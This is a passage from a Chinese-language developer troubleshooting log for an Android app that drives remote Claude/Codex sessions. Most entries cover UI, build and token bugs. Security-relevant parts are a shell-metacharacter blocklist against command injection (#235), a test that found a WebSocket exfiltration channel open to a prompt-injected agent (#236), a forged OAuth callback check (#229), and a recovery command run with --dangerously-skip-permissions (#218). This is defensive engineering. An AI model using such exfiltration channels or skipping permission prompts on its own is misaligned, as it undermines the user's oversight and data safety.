  GitHub 那条 `one-time code: XXXX-XXXX` 正则套不上。`codex login status` 没登录时退出码 1、打 `Not logged in`；
  `claude auth status --json` 没登录也退出 1 —— 状态命令**不能**写成 `cmd || echo NO_X`，会把「没登录」错报成「没装」。
- 两家都不需要 Node：Claude 官方原生安装器（`curl -fsSL https://claude.ai/install.sh | bash`），Codex 用 GitHub release 的
  `codex-<arch>-unknown-linux-musl.tar.gz`（92MB 静态二进制，解开 250MB）。npm 那条路只是历史。
- 公网站点 nginx 是白名单式放行（`location / { return 404; }` 收尾），新文件要在 `/etc/nginx/snippets/yxi-dl.conf` 里加 location
  （`/bootstrap.sh`、`/server/`，带 `Cache-Control: no-cache` 免得 CDN 缓存旧脚本），否则 scp 上去了照样 404。

## #218 手机上「拉起」歇掉的会话 → 对话页显示旧转录、终端却是空白新会话：tmux 里敲 `claude` 从不带 `--resume`
- 症状：cc-Yxi 被 SessionEnd 结束（17:24:05，三个后台任务同一毫秒死，`~/.yxi/events.jsonl` 里有那条 SessionEnd），卡片进「未启用」；
  点「拉起」→ 终端里是一个**没有历史的新对话**，对话页却还显示旧转录（TranscriptStream 按登记/本地缓存找到的是旧 jsonl）。用户原话：
  「对话里面显示的是截图的样子但是我们终端里面是空的」。
- 根因：「拉起」= `Dirs.createCommand`：`tmux new-session -d -s cc-Yxi -c <dir>` + `send-keys claude`。bashrc 的 `claude` 函数 → `cloud-enter`，
  它**在 tmux 里那条分支只 `exec claude`，从不查登记表**——只有 tmux 外「离线但有登记」那条分支才 `cc-sessions resolve` 补 `--resume`。
  watchdog 也不救：SessionEnd 让 `cc-state` 打了 `ended=true`，`recoverable` 按设计过滤主动退出的。两边都不接 → 全新对话；
  新对话的 SessionStart 钩子随手把登记 uuid 覆盖成自己的，旧 uuid 只剩 `~/.claude/projects/<目录>/` 里按 mtime 找。
- 修法：`remote-dev-station/bin/cloud-enter` tmux 内分支按当前 `#{session_name}` 查 `cc-sessions resolve`，有就补 `--resume`
  （resolve 不看 ended，和 tmux 外那条一致）。本机已 cp 到 `~/.local/bin/cloud-enter`。**App 侧不用改也改不了**——`claude` 函数吞掉所有参数，
  App 敲 `claude --resume x` 到不了二进制。
- 天花板：只有装了 remote-dev-station 那套（cc-state 登记 + cloud-enter）的机器才有「拉起即接回」。只跑 `bootstrap.sh` 的新客户机没有登记表、
  `claude` 是裸二进制，「拉起」永远是新对话——要做得在 App 侧按 `~/.claude/projects/<目录编码>/` 最新 jsonl 传 `--resume`（同目录双开有风险），等真需要再做。
- 找回旧对话：`tmux respawn-pane -k -t '=cc-Yxi:' "cd <dir> && IS_SANDBOX=1 claude --effort max --resume <旧uuid> -n Yxi --dangerously-skip-permissions"`。
  **别指望先改登记表再「拉起」**：（窗格目标要写 `=cc-Yxi:` 带冒号，光 `=cc-Yxi` 会报 can't find pane）当前会话被杀时它自己的 SessionEnd 钩子会把登记 uuid 又写回自己的，改了白改。
- **App 侧补上了（0.9.79）**：「拉起」走 `Dirs.createCommand(resume = true)` —— 在 shell 里按 `~/.claude/projects/<路径非字母数字换成 ->/`
  找最近那份 `<uuid>.jsonl`，有就 `claude --resume <uuid>`，没有才裸起。只跑了 bootstrap.sh 的客户机器也能接回；
  本机的 `claude` 是 cloud-enter 包装，参数到不了二进制，靠上面那条修法。Codex 不接（`codex resume --last` 没历史会报错）。

## #219 用 Archify 给项目画「可验证架构图」推进实验室：三个坑

- **要 Node**：`node bin/archify.mjs`，本机 Node 18 能跑；只跑了 bootstrap.sh 的客户机器没有 Node，提示词里写了「没有就自己写 SVG / HTML」。
- **出的 HTML 引 Google 字体**（JetBrains Mono 的 `<link>` / `@import`），`yxi-lab check` 直接 ✗。deliver 之后把这些引用剥掉（正则删 `fonts.googleapis` / `fonts.gstatic`），
  回落系统等宽字体；剩下的 `http://www.w3.org/2000/svg` 是 SVG 命名空间，不是外链。约 700KB，在 1MB 限制内。
- **showcase 校验极严**：连线穿过无关节点、两条线交叉、标签压节点都算 error，手排 `pos` 几乎必挂。
  用 `layout: {mode: grid, cols, cellW, gapX, gapY}` + `row/col` 让它自己排，连线按**真实路径**归并（手机只连 sshd，别从手机拉五条线进服务器），
  标签压节点按它给的 `labelDy` / `labelAt` 建议改。standard 档比 showcase 松，试作用 standard 就够。
- 手机上看：它是桌面尺寸的页，卡片预览只能看个轮廓，得全屏 + 捏合放大（0.9.80 起 WebView 开了缩放）。

## #220 「一次上传多个有 bug」：两条路各一个坑

- **分享面板多选进不来**：manifest 只注册了 `ACTION_SEND`，相册里勾多张分享走的是 `ACTION_SEND_MULTIPLE`（`EXTRA_STREAM` 是 `ArrayList<Uri>`），
  Yxi 要么不出现在分享面板里、要么只拿到一张。修法：补 `SEND_MULTIPLE` 的 intent-filter，`ShareActivity` 按列表顺序传、`renumber` 后一条消息带全部。
- **App 内多选看不见、停不下来**：原来一批是一条协程顺序传，界面只有一句「传着… n/m」，单个文件既没有卡片也没法取消，
  中途离开对话页整批悄悄没了。修法：选中即出卡，每个文件各自协程 + Mutex 排队；取消靠 jsch 的 `SftpProgressMonitor.count` 返回 false
  （它没有干净的 cancel，中止是抛 SftpException，按 `cancelled` 标记区分），并 `rm` 掉传了一半的远端文件；时间戳加毫秒，
  同一秒选中的同名文件不再互相覆盖。
- ⚠️ 仍有的天花板：`Upload` 的协程挂在对话页的 scope 上，**离开对话页 = 取消在传的**；要后台上传得挪到 app 级 scope（跟自更新那条一个路子）。


## #221 退到看板再进对话要等好几秒：每次都从头拉转录

**症状**：从会话退到看板、再进同一个或另一个会话，先「正在载入对话」转几秒。
**根因**：ChatScreen 一销毁什么都不剩，重进走全套：`latestFor` 找文件（一趟）、`tail -n 60` 首屏（0.5MB）、
`tail -n 400 -f` 灌历史（4MB）—— 手机网络下就是那几秒，会话越长越慢。
**修法**：进过的对话留在进程内存（`ChatMemory`，LRU 6 个）：条目、`Transcript.Incremental` 解析器、转录已读到的**字节位置**。
重进先原样摆出上次的列表，再 `tail -c +N -f` 从那个位置只拉增量；没新内容 = 零流量。第一次进也改成按字节起点跟随
（`tailStart` 一趟拿 文件大小 + 最后 400 行的字节数），这样读到哪个字节算得出来。字节数按 UTF-8 算再加换行。
⚠️ 转录文件换了（`/clear`、换 uuid）按文件路径核对，不同就整条作废重来。⚠️ 进程被系统杀掉内存就没了，那时退回磁盘上的 60 行缓存（原有）。

## #222 「发布还在跑」等了两小时 —— 等待脚本 `pgrep -f` 匹配到了它自己

**症状**：0.9.86 / 0.9.87 排队等「上一个发布结束」，两个多小时过去公网清单还是 0.9.84；日志显示各次发布早就结束。
**根因**：等待脚本写的是 `until ! pgrep -f "install.sh --publish"; do sleep; done` —— 这个 bash 进程自己的命令行里就含
`install.sh --publish` 这串字，`pgrep -f` 永远能匹配到自己（和别的等待脚本），于是永远等。跟 `pkill -f` 自杀（exit 144）是同一族。
**修法**：判「有没有发布在跑」用锁：`flock -n /tmp/.yxi-publish.lock true`（install.sh 本来就拿这把锁）；非要用 pgrep 就写
`pgrep -f "instal[l].sh --publish"`（方括号让模式串本身不匹配模式）。

## #223 发出去一个「清单 133、包 132」的版本：编译失败没看见，旧包被签成了新号

**症状**：0.9.89 发布中途发现签好的包 `versionCode='132'`；公网清单已经翻到 133、指向一个内容是 0.9.88 的文件。
装了 0.9.88 的手机会永远提示「有更新」、装完还是 0.9.88。
**根因**：① 编译其实失败了（`compileReleaseKotlin` 报错），但我看结果只 `grep -c "^e: "`，这次的报错格式不带 `e:`，被当成 0 个错误；
② 签名脚本对着 `outputs/apk/release/app-release-unsigned.apk` 签，那是上一版留下的旧包；③ `aapt2 dump badging` 打出了 132，我只打印没校验。
**修法**：`install.sh --publish` 现在先用 aapt2 读包里的 versionCode，跟参数对不上直接拒发；签名后的检查也要 `[ "$IN" = "$CODE" ] || exit`。
判编译成败看 `[gradle exit N]` 和 `BUILD FAILED`，别只数 `e:` 行。
**善后**：公网清单和下载按钮改回 132、删掉错误的 133 文件、本机清单回滚 —— 都在 #223 当天做了，公网上没停留超过 10 分钟。

## #224 输入框里的字删不掉（0.9.92）：if/else 两种排版各放了一个 BasicTextField

**症状**：打了几行字之后退格没反应、字删不掉，怎么点都不动。
**根因**：0.9.92 学 Gemini 做「一行一排 / 多行两段」两种排版，写成 `if (lines <= 1) Row { BasicTextField } else Column { BasicTextField }` ——
行数跨过 1↔2 时 Compose 认为是**另一个**组合位置，旧实例销毁、新实例重建，输入法的组合 / 选区状态还挂在死掉的那个上，
后面的按键作用在幽灵实例上。边界处还会因为删一个字又换回去，来回抽。
**修法**：`remember { movableContentOf<String> { d -> BasicTextFieldRow(d, …) } }`，同一个实例在两种排版间**搬家**（内部状态跟着走）；
多行排版一旦进入就粘住，直到清空才回单行。另给了两个逃生口：多行排版里的「清空」，开发者卡片里的「清空所有输入框草稿」
（草稿存在 SharedPreferences 的 `draft:*`，`Drafts.clearAll`）。
⚠️ 通用教训：**受控组件（文本框、WebView、播放器）别放在 if/else 的不同分支里**，要换布局用 movableContentOf 或固定槽位。

## #225 输入框周围「一大片黑色阴影，中间一块白」：透明 Surface 配 shadowElevation

**症状**（用户录屏，0.9.92）：打字时输入框周围一大片黑影、里面一块白；不打字时中间一条细白线。
**根因**：`Surface(color = Color.Transparent, shadowElevation = 3.dp)` —— Material 的阴影是按形状画在面**下面**的，
面透明就把阴影整个露出来；再叠 `.clip` + 两层 `.background`，边缘留一条没被盖住的白线。
**修法**：阴影 / 光晕自己画（`drawBehind` 画一圈径向渐变，还能呼吸），面用半透明白当玻璃底，不再用 elevation。
⚠️ 通用：**要阴影就给不透明的面；要透明的面就别要 elevation。**

## #226 点「↓ 跳到底部」按钮之后它一直闪

**症状**（用户录屏，0.9.94）：点右下角的 ↓ 之后，按钮不停地闪、位置还上下跳。
**根因**：两个环。
① 点 ↓ → 到底 → 「到底就展开上下栏」→ 输入框回来 → 列表底部留白从 8dp 变成输入框高 → **又能往下滚了** →
「不在底部」→ ↓ 按钮重新出现，而且它自己的 bottom 也是这个留白，于是跟着跳。
② 程序滚动（`scrollToItem`）在 Compose 里**照样往 NestedScrollConnection 派发**，被当成用户下滑 → 收起栏 → 到底又展开。
**修法**：留白恒定给输入框高（收起时你本来就不在底部，那段留白看不见）；`onPreScroll` 只认 `NestedScrollSource.UserInput`。
⚠️ 通用：**别让「滚动位置」和「布局尺寸」互相当因果** —— padding 依赖 atBottom、atBottom 又依赖 padding，必然自激。

## #227 「点 ↓ 之后一直闪」的真因：条目进入动画被反复重放

**症状**（用户录屏两次，0.9.94 / 0.9.95）：点了「跳到底部」的 ↓ 之后，屏幕一秒闪两下。
逐帧看：整个正文区**白一下**，再淡入 —— 而且淡入后的内容跟上一帧完全不是同一段。

**排查**（值得记）：
- 先按「按钮 AnimatedVisibility 反复淡入淡出」修了一版（粘着时不显示按钮）——**没修掉**。
- 又按「跟随滚动读到过期的 totalItemsCount，先往回跳一条再往前」修了一版 —— 也不是（那是**测量方法**的锅：
  造的假数据每行文字一模一样，互相关对齐会锁到错误的周期上，把 -143px 读成 +116px。⚠️ **拿重复内容做位移测量必错**）。
- 最后在模拟器上打点（`firstVisibleItemIndex` / `off` / `totalItemsCount`）才看清：跟随本身是单调往前的，没问题。
  真正的问题在**渲染**：用户那段录屏里，整屏条目是**一起重新淡入**的。

**根因**：`fresh = seenKeys != null && item.key !in seenKeys` —— 判据只有「是不是进页面之后才出现的」。
LazyColumn 里条目滚出屏幕会被**销毁**，滚回来重新组合，`fresh` 又是 true → **再放一次进入动画**。
活跃会话里列表一直在跳，一屏条目同时重放，就是「整屏白一下再淡回来」。

**修法**：加一个 `animated: MutableSet<String>`，`animated.add(key)` 只有第一次返回 true ——
**一条消息的进入动画一辈子只放一次**；再要求 `i >= rows.size - 3`（只有末尾新来的才动画）。
⚠️ 通用：**列表项的「入场动画」条件必须是「这条从没入过场」，不能是「这条是新内容」** —— 后者在虚拟化列表里会随组合反复成立。

## #228 对话页「一闪一闪一跳一跳」：跟随时的瞬移 + 每次变动都追

**症状**：会话在出字时，对话内容每秒抖两三下，像闪。用户报了三次。

**为什么前两次没修对**：都是拿**合成数据**测的 —— 每行文字一模一样、全是短文本。
那种数据下跟随每次只挪一条，看不出问题。换成**真转录回放**（长回复 + 工具卡 + 队列消息）一测，一秒 1.5 次整屏跳变。
⚠️ **界面性能/抖动类问题，测试数据必须跟真实内容同形**（长短不一、有大卡片、有会消失的临时条目）。

**三个叠在一起的原因**：
1. `scrollToItem(last)` 是把**最后一条的顶部**对齐屏幕上沿。最后一条要是长回复或大工具卡，
   这一下就把画面甩到别处，下一帧才靠 `scrollBy` 补回底部 —— 每来一批甩一次。
   → 看得见最后一条时改成**只补差值**（`lastVis.offset + size - 视口末端`）；远了才 `scrollToItem(last, 100_000)` 一次到位。
2. 跟随是**瞬移**。→ 改成 `animateScrollBy(delta, tween(170))`，是「滑了一段」不是「换了一屏」。
3. 每次 `items` 变动都追。转录 300ms 刷一批、一批还常分几次到，**队列里的消息（排队中/别的 agent 注入）在末尾一冒一消**，
   每次都追就是一秒抽三次。→ `snapshotFlow{}.collectLatest{ delay(110); scrollToEnd() }`，等它安静下来再追。

**顺带**：⚠️ **在软件渲染的模拟器上量不出「动画顺不顺」** —— 应用只渲染个位数帧率，170ms 的动画就是一两帧，
逐帧看跟瞬移一样。判断动画有没有生效要看日志（分支 + 参数），不要看录屏帧。

## #229 会员服务对接的三个坑（都在发版前撞掉了）

1. **`POST + X-HTTP-Method-Override: PATCH` 不管用**：服务端只注册了 PATCH 路由，POST 直接 404
   （`curl -X POST` 试出来的，401 才说明路由在）。必须发真正的 PATCH ——
   Android 的 HttpURLConnection 是 OkHttp 实现的、认 PATCH；兜底再用反射改 `method` 字段。
   ⚠️ **对接别人的接口，先用 curl 把每个方法打一遍看状态码**：401 = 路由在只是没带票，404 = 你走错门了。
2. **`quota.remaining: null` 用 `optInt` 读会变成 0**：契约里 null 是「ultra 不限」，0 是「用完了」—— 意思正好相反，
   界面会给不限的用户显示「这个月改不了了」。JSON 里**可空的数字必须先 `isNull` 判**。
3. **OAuth 回调一定要校 `state`**：不校的话任何 App 都能拿 `io.yxi.app://callback?code=…` 塞给你。
   实测用 `adb shell am start -a VIEW -d "io.yxi.app://callback?code=fake&state=wrong"` 打了一发，
   校验生效（不存任何 token）—— 这条验证很便宜，值得每次都做。

## #230 `optString` 读 JSON null 给的是字符串 "null"

**症状**：个性签名没设过的账号，编辑框里明晃晃写着 `null`。
**根因**：Android 的 `JSONObject.optString(key)` 在值是 JSON null 时返回**字符串 `"null"`**，不是空串
（fallback 只在「没这个键」时生效）。
**修法**：所有可空字符串统一走一个小工具：`isNull(key)` 先判，再把 `"null"` 也当空串。
⚠️ 通用：**接口里能给 null 的字段，一律不要直接 `optString`**。

## #231 「每敲一个字就重排整串」的输入框会串位

**症状**：兑换码框里灌进 18 个字符，跟源码**长度一样但 9 个位置对不上**（`adb shell input text` 复现）。
**根因**：`onValueChange` 里把整串重新格式化（补连字符）再写回去 —— 输入快的时候（连续注入 / 粘贴 / 有些输入法的批量提交）
新值和状态回写互相追，字符顺序就乱了。
**修法**：**存纯值，连字符只在显示层画**（`VisualTransformation` + `OffsetMapping`），输入框里的值一个字都不动。
⚠️ 通用：**格式化不要写回输入框的值**（手机号、卡号、兑换码都一样）。

## #232 状态传了但从来没置位：录音态整个是死的

**症状**：按住说话时麦克风不变红。查下去发现 `recording` 这个状态**在整个文件里只有读、没有写** ——
写的时候把它当参数一路传下去了，却忘了在「录音真的开始了」那一步 `= true`。
**根因**：布尔状态的「置位点」和「使用点」隔了三层（按钮 → 回调 → 录音器），漏一处编译器不会说话。
**修法**：`recorder.start()` 成功那一支里置 true，`onStop` 里置 false。
⚠️ 通用：**加了个状态就顺手搜一遍它被赋值几次**——只有初始值那一次，说明这个功能从没生效过。

## #233 `~/.local/bin` 里的命令：非交互 ssh 找不到 = 「装了等于没装」

**症状**：服务器上明明装了 `yxi-asr`，App 里语音还是走系统识别（而用户手机 GMS 关着，系统识别根本不存在，
表现就是**麦克风点了没反应**）。
**根因**：探测用的是 `ssh host "command -v yxi-asr"`。**非交互 `ssh exec` 不读 `~/.profile`/`~/.bashrc`**，
PATH 只有 `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`，而 `pip install --user` 装在 `~/.local/bin`。
**修法**：所有远端命令前面加 `export PATH="$HOME/.local/bin:$HOME/bin:/usr/local/bin:$PATH";`。
⚠️ 通用：**别用 `ssh host "command -v X"` 判断远端有没有 X** —— 交互 shell 找得到不代表 exec 找得到。
自己验一下：`ssh host 'echo $PATH'` 跟你登上去 `echo $PATH` 是两个东西。

## #234 开了 R8 之后「一点终端就整个 App 没了」—— native 按**字段名**取值，被混淆改掉

**症状**：1.0.5 开混淆后编译全绿、SSH 正常、看板 21 个会话都在，**唯独点「终端」整个进程瞬间消失**。
logcat 里是 native 崩溃，栈顶在 `libndk_translation.so`（模拟器的 ARM 翻译层）——**极容易误判成模拟器的锅**。
往下翻才是真话：

```
Abort message: 'Throwing new exception 'no "I" field "fgGreen" in class
"Lorg/connectbot/terminal/CellRun;"' … java.lang.NoSuchFieldError: no "I" field "fgRed"
    at org.connectbot.terminal.TerminalNative.nativeInit(...)
```

**根因**：终端控件 `org.connectbot:termlib` 的 `libjni_cb_term.so` 用 `GetFieldID("fgRed")` 这类
**按名字**取 Java 字段。R8 把 `CellRun.fgRed` 改名 → JNI 找不到 → 直接 abort（不是抛异常，是杀进程）。
proguard 规则里当时只 keep 了 jsch / BouncyCastle / sherpa-onnx，**漏了它**。

**修法**：`-keep class org.connectbot.terminal.** { *; }` + `-keepclassmembers … { <fields>; <methods>; }`。

⚠️ **通用**：判断「哪些库开混淆会崩」不要靠印象，**按包里的 `.so` 反查**：
`unzip -Z1 app.apk 'lib/*'` 列出所有 native 库，每一个都要问一句「它回头找 Java 时按名字还是按符号」。
本项目当时包里有 6 个 `.so`，规则只覆盖了 4 个。
⚠️ **验证也别偷懒**：确认规则生效可以直接查 dex 字符串表 ——
`unzip -p app.apk classes.dex | strings | grep -c '^fgRed$'` 应该是 1（被改名就是 0）。

## #235 安全白名单静默吃掉了用户 8 个中文会话（30 个只显示 22）

**症状**：红队 E2E 时顺手对了一下数：服务器上 30 个 `cc-*` 会话，App 看板只有 22。
少的正好是 `cc-今天` `cc-文件` `cc-日常对话` `cc-智商题` `cc-环境` `cc-诗歌` `cc-项目` `cc-文件传`。
**没有任何报错**——会话就是不见了。

**根因**：修命令注入时给会话名加了白名单 `^[A-Za-z0-9._@%+=,:-]{1,64}$`。
写的时候脑子里想的是「我见过的会话名长这样」，而会话名是**用户自己起的**，中文天经地义。

**修法**：判据从「允许我认识的字符」改成「**这个名字当 shell 参数会不会跑出命令来**」——
黑名单 `' " ` $ ; & | < > \ /` + 控制字符（`/` 也挡是因为同一个函数还被拿去拼远端路径）。
中日韩、空格、括号配上单引号转义完全无害。见 `ssh/Shell.kt`。

⚠️ **通用**：**白名单只能用在「格式由我们规定」的字段上**（版本号、id、枚举值）。
凡是**用户或外部系统起的名字**，白名单一定会误杀，而且是静默误杀 —— 那时候要的是危险字符黑名单。
⚠️ 这个洞光看代码看不出来（规则本身很"安全"），是**拿真机器上的真数据对数**才露的：
凡是加了过滤，就去数一遍「过滤前 N 条、过滤后 N 条」。

## #236 实验室页面能开 WebSocket 出网 —— `blockNetworkLoads` 和 `shouldInterceptRequest` 都管不着

**症状**：往实验室推了一张出网自检页，结果：外链 `<img>` 挡住了、`fetch`/XHR/`sendBeacon`/`<script src>`
也挡住了（服务器侧监听一条请求都没收到），但 **`new WebSocket('wss://echo.websocket.org')` 的 `onopen` 触发了**
—— 对方回了 HTTP 101，那是一条**真的通向公网的连接**。

**根因**：`settings.blockNetworkLoads` 管的是**资源加载**；`WebViewClient.shouldInterceptRequest`
**不会为 WebSocket 回调**。两道防线在 WS 上都是空的。而实验室页面是**服务器上的 agent 写的**，
「agent 被提示词注入」是我们明写的威胁模型 —— 等于留了一条无声的外传通道。

**修法**：加载前往 HTML 里插一条 CSP `<meta>`，`connect-src 'none'`（fetch / XHR / WebSocket /
EventSource / sendBeacon 全归它管）。见 `ui/WebFence.kt`。插入位置取「`<head>` 之后」和
「第一个 `<script` 之前」**靠前的那个** —— 恶意页面会故意把脚本写在 `<head>` 前面。

⚠️ **通用**：**「我挡住了 fetch」不等于「它出不去网」。** 判据不能看页面里的回调
（`fetch` 被拦截器喂了空应答一样会 resolve，看着像"出去了"其实没出去；反过来 WS 的 onopen 是真的），
**只能看服务器有没有收到请求**。测出网就起一个监听自己数。

## #237 悬浮页眉下面的那几行：`status` 一为空就整条钻进状态栏

**症状**：对话页顶上那条状态（模式 / 模型 / 上下文 / 今日）有时看得见、有时"没显示"。
uiautomator 抓出来才发现它**在**，只是被画到了 `y=18..60` —— 系统状态栏底下，页眉之上。

**根因**：页眉是**悬浮**的，它的高度只进了列表的 `contentPadding`（#228 那条：不能在 Column 里留位置，
否则页眉收起时会露出永久白条）。而列表**外面**还有三行（状态提示 / 状态带 / 「正在做」），
当时只有第一行 `status` 加了 `padding(top = headerDp)`。`status` 一为 null，后面那两行就顶到了 y=0。

**修法**：谁是**第一个真正渲染出来的**，谁加这段 top —— 用 `if (status == null) headerDp else 0.dp`
这样一路串下去。不能给 Column 整个加（那就退回 #228 的白条）。

⚠️ **通用**：悬浮栏 + 「列表外面还有几行」是个组合陷阱：只要这几行是**条件渲染**的，
就必须按「谁排第一谁让位」写，不能挂在其中某一行上。

## #238 模拟器上跑 release 包会 ANR —— 因为 release 是 arm64-only，在 x86_64 模拟器上全程翻译执行

**症状**：同一份代码，debug 包在模拟器上顺滑，release 包点一下就 "Yxi isn't responding"，
而且 logcat 里的 native 崩溃栈顶都在 `libndk_translation.so`，看着像"混淆搞崩了"。

**根因**：`defaultConfig` 里 `abiFilters += "arm64-v8a"`，debug 额外并上 `x86_64`（两者是**并集**）。
所以 release 包在 x86_64 模拟器上是靠 NDK translation 跑的 —— 慢一个量级，主线程稍微一忙就超 5 秒。

**修法 / 怎么避开**：要在模拟器上验 release 的**混淆规则**（那是 dex 层面的，跟 ABI 无关），
就临时给 release 也并上 `x86_64` 编一个包来跑，验完撤掉。别拿翻译层下的 ANR 当 App 的性能问题。
⚠️ 顺带：宿主机 load 高的时候（本机实测 load 20+、steal 22%）模拟器同样会 ANR —— 先 `uptime` 再下结论。

## #239 refresh token 会**轮换**，旧的重用一次就把整条授权作废

**背景**：加了「没登录不让用」的全屏门禁之后，掉登录 = **App 直接打不开**，所以令牌这条路一点都不能松。

**事实**（cc-logto_yxi 2026-09-04 在 Logto 源码 + 真跑里确认）：我们是 Native **公开客户端**，
`clientAuthMethod == none` 时 Logto **强制轮换** —— 每次刷新都发一个新的 refresh token，
旧的只有**约 5 秒宽限**。实测：

```
rt1 刷新 → 200，拿到 rt2
立刻再用 rt1 → 200（宽限期内）
等 5 秒再用 rt1 → 400 invalid_grant
然后 rt2 也变成 400 invalid_grant     ← 重用旧令牌会撤销整条授权
```

**三条必须做到**：
1. 每次刷新把返回的**新** refresh token 存回去；
2. **刷新必须串行**（`Account.refreshLock`）。两个线程同时刷 = 一个成功、另一个拿旧的重用，
   还会互相盖掉对方存下的新令牌 —— 冷启动同时打几个接口正是最容易撞的场景；
3. 收到 400 **别拿同一个令牌重试**，直接走重新登录。

⚠️ 另外：refresh token TTL **14 天**（Logto 默认，我们没覆盖）。两周不开 App 的人回来要重登。

## #240 明明登着，界面写「未登录」

**症状**：刚登录完，侧边栏和「我的」里的会员卡都显示「未登录」。

**根因**：`signedIn`（本机有没有 refresh token）和 `me`（`GET /api/me` 拉回来的资料）是**两个状态**，
而 `/api/me` **只在打开「会员中心」时才拉**。于是登录完到进会员中心之前，`me` 一直是 null，
而那一行写的是 `me?.tier?.name ?: "未登录"`。

**修法**：① 进 App 时（已登录）就拉一次；登录回调成功后也拉一次。
② 那一行的兜底改成「已登录」——**不能写「未登录」**（人明明登着），也**不能兜底写 Free**（那是猜档位，猜错就是骗人）。

⚠️ 通用：**「有凭证」和「知道你是谁」是两件事**，界面上任何一处把两者混成一个布尔值，都会说出假话。

## #241 打字打到换行那一下，键盘自己收起来

**症状**：在输入框里打字，偶尔键盘突然收起（用户：「概率不大」）。

**根因**：输入框在「一行」和「多行」两种排版间用 `movableContentOf` 搬家（#224 那个修法）。
`movableContentOf` 保住的是**状态**（选区、输入法组合），**不是焦点** ——
节点从 Row 上摘下来挂进 Column，焦点跟着断，键盘当场收起。
「概率不大」是因为 `multi` 是粘住的：一段草稿只在**第一次换行**那一下掉一次。

**修法**：给输入框挂 `FocusRequester` + `onFocusChanged`，`multi` 变化后若原本有焦点，
等一帧（`withFrameNanos`）再把焦点要回来。

⚠️ 通用：**只要用了 `movableContentOf`，就得自己接管焦点**。

## #242 用 `adb input` 测输入框，测出来的是假结果

踩了两次，都让一轮测试白做：

- **`adb shell input text` 送不了非 ASCII**。中文整段被静默丢掉 —— 屏幕上什么都没有，
  而脚本一路 `returncode 0`。当时还以为「打了字键盘没掉」，其实一个字都没进去。
- **注入按键本身会关掉输入法**。`input text` 走的是 `injectInputEvent`，绕过 IME，
  发完 `mInputShown` 就变 false —— 于是「键盘掉了」永远成立，跟被测代码无关。

⚠️ 所以**软键盘相关的行为在模拟器上用 adb 注入是测不了的**。要么在真机上手指点，
要么改成测**可观测的中间状态**（比如节点的 `focused` 属性），别测 `mInputShown`。

## #243 这台 AVD 上的 Chrome 起不来 —— 拿它测 OAuth 回跳会卡死

**症状**：登录要跳浏览器，而模拟器上的 Chrome 反复 "Chrome isn't responding"，
清数据、重启、等几分钟都不行（日志里它确实在跑：有网络请求、有 GC，就是慢到必然 ANR）。

**绕法**：自己编一个**极简 WebView 浏览器**（一个 Activity、40 行、无依赖），
注册 `http/https` 的 VIEW intent-filter，在 `shouldOverrideUrlLoading` 里把非 http(s) 的
scheme（我们的 `io.yxi.app://callback`）当 Intent 发出去 —— 这正是 Chrome 在 OAuth 里做的事。
然后 `pm disable-user com.android.chrome`，它就成了唯一的浏览器。

不用 Gradle 也能出包：`aapt2 link` → `javac` → `d8` → `zip` 进 apk → `zipalign` → `apksigner`。
整套二十行命令，比修 Chrome 快得多。**以后测任何 OAuth / 深链回跳都可以用它。**

## #244 构建变慢：`--no-daemon` 是主因，不是 R8

**症状**：用户 2026-09-04：「为什么这么慢，之前的更新和构建不要那么久」。

**三个原因，按影响排**：
1. **每次都带 `--no-daemon`** —— 这是为了躲开「守护进程堆到 3.1GB 拖垮共享机器」那次事故。
   代价是每次冷启一个 JVM、丢掉所有进程内缓存：空构建 30 秒起步。
   `gradle.properties` 里的 `-Xmx2048m` 早就把堆封住了，再加 30 分钟空闲自杀即可 ——
   **实测空构建 30 秒 → 4 秒**，守护进程稳定在 0.8GB。
2. **release 现在跑 R8**（1.0.5 起）：混淆 + 资源压缩本身就要一两分钟。
   **改界面用 `assembleDebug` 迭代**，只有发版和验混淆规则时才 `assembleRelease`。
3. **机器本身在忙**：那天 load 20+、CPU steal 6~22%（其中一个是用户 VS Code 把 `/root` 当工作区、
   索引带 `--follow` 爬进了 `/sys`，一个 `rg` 吃 583% 跑了近两小时）。这种时候谁都快不了 ——
   下结论前先 `uptime` 和 `vmstat` 看一眼，别把机器的问题当成构建配置的问题。

## #245 连过 SSH 之后，整个进程的 HTTPS 全废（潜伏很久，被强制登录放大成致命）

**症状**：App 刚起来一切正常；**连上一台主机之后**，账号接口、检查更新、会员中心
**全部悄悄失败**。日志里只有一句「没拿到 token」，界面上什么都不说 ——
「我的」和会员中心只是显示兜底值（免费版、未登录），看不出发生了什么。

真正的异常藏在一层 runCatching 里：

```
java.security.NoSuchAlgorithmException: Error constructing implementation
(algorithm: Default, provider: AndroidOpenSSL,
 class: com.android.org.conscrypt.DefaultSSLContextImpl$TLSv13)
```

**根因**（两条叠在一起）：
1. 我们为了 **Ed25519**（安卓 JCA 不提供）要动 provider：`removeProvider("BC")` +
   插完整版 BouncyCastle。原来是 `insertProviderAt(…, 1)` —— **排在 Conscrypt 前面**，
   于是 `TrustManagerFactory.getDefaultAlgorithm()`（PKIX）解析到 BC 的实现，
   而它读不了安卓的系统信任库。
2. 安卓的 `DefaultSSLContextImpl` 是**懒初始化**的：第一次有人要 HTTPS 时才构造，
   **而且构造失败会被永久缓存**。所以出不出事完全取决于「第一次 HTTPS」和
   「第一次连 SSH」谁先谁后 —— 这就是为什么它能潜伏这么久：
   以前先登录（HTTPS）再连主机，顺序恰好是好的。

**修法**（`ssh/Crypto.kt`，两条都要）：
- 动 provider **之前**先 `SSLContext.getInstance("Default")` 把好的那份构造出来缓存住；
- BouncyCastle 用 `addProvider`（排最后），**不要** `insertProviderAt(…, 1)`。
  Ed25519 只有它提供，排最后照样找得到；TLS 继续归 Conscrypt —— 那本来就是安卓的正常状态。

⚠️ **通用一**：**动全局 JCA provider 是有副作用的**，而副作用落在别人身上（HTTPS），
且只在特定调用顺序下发作。改 provider 之前先想清楚「谁会因为顺序变了而拿到不同的实现」。
⚠️ **通用二**：这个 bug 能活这么久，是因为**失败被吞了**——`refresh()` 返回的错误字符串
从来没人显示。加登录门禁之后它变致命（令牌续不上 = 用户被卡在门外）才暴露。
**所有返回错误的函数，界面上必须有一处会把它说出来。**

## #246 兑换框替用户「整理」兑换码，结果只有一种格式的码能兑

**症状**：拿到后台新签发的测试码 `YXITEST-BAL-100`，输进兑换框，框里显示
`YXI-TEST-BAL0-0` —— 这张码永远兑不掉，而且报的是「兑换码不存在」，
看起来像后台的问题。

**根因**：输入框做了两件自作聪明的事 —— 把用户敲的连字符**全过滤掉**
（`filter(Char::isLetterOrDigit)`），再按「3-4-4-4」重新画上，
